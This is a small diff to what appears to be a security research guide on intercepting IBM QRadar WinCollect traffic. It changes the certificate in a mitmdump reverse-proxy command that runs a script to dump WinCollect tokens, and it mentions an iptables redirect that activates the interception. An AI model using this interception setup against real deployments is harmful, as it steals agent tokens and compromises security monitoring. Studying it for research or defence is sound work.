@@ -147,7 +147,7 @@ Now we can run the mitm server in a dedicated screen console.
 
 #### WinCollect mitm listener - with mitmdump (with optional [script to dump tokens](./dump_wcollect_tokens.py) )
 
-    [[ $MITM_PORT_WCOLLECTCFG -gt 0 ]] && screen chroot /root/mitmproxy mitmdump  --ssl-insecure --certs /cert.pem --set websocket=false --set onboarding=false --no-http2 --mode reverse:tls://${QRADAR_IP}:8413@${QRADAR_IP}:${MITM_PORT_WCOLLECTCFG} -s dump_wcollect_tokens.py
+    [[ $MITM_PORT_WCOLLECTCFG -gt 0 ]] && screen chroot /root/mitmproxy mitmdump  --ssl-insecure --certs /syslog-tls.pem --set websocket=false --set onboarding=false --no-http2 --mode reverse:tls://${QRADAR_IP}:8413@${QRADAR_IP}:${MITM_PORT_WCOLLECTCFG} -s dump_wcollect_tokens.py
 
 
 Lastly, we install an iptables `REDIRECT` rule to divert incoming traffic to mitm server and thus activate the interception.
